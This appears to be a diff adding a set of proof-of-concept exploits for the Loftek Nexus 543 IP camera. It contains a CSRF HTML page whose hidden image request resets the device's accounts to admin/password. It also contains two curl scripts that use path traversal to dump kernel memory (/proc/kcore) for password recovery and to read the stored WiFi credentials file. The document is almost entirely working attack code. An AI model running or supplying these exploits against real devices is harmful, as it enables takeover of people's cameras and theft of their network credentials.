@@ -1,0 +1,32 @@
+CSRF:
+
+<HTML><TITLE>Loftek Nexus 543 CSRF PoC</TITLE>
+<IMG SRC="http://ip-camera-address/set_users.cgi?next_url=rebootme.htm&user1=admin&pwd1=password&pri1=2&user2=anon&pwd2=password&pri2=0&user3=&pwd3=&pri3=1&user4=&pwd4=&pri4=0&user5=&pwd5=&pri5=0&user6=&pwd6=&pri6=0&user7=&pwd7=&pri7=0&user8=&pwd8=&pri8=0" ALT="Your password has been reset to admin/password">
+</HTML>
+
+
+Memory Dump:
+
+#!/bin/sh
+# This script exploits CVE-2013-3311 to retrieve kernel memory from a Loftek Nexus 543 IP camera
+# The file which is downloaded can be analyzed (strings) to recover passwords and other goodies
+
+
+if [[ "$1x" != "x" && "$2x" != "x" ]]; then
+	curl http://$1/../proc/kcore -o $2 
+	exit
+fi
+echo "Usage: $0 Nexus-543-IP output_file" 
+
+WiFi Creds:
+
+
+#!/bin/sh
+# This script exploits CVE-2013-3314 to retrieve wifi credentials from a Loftek Nexus 543 IP camera
+
+if [ "$1x" != "x" ]; then
+	curl http://$1/../etc/RT2870STA.dat
+	exit
+fi
+echo "Usage: $0 Nexus-543-IP" 
+
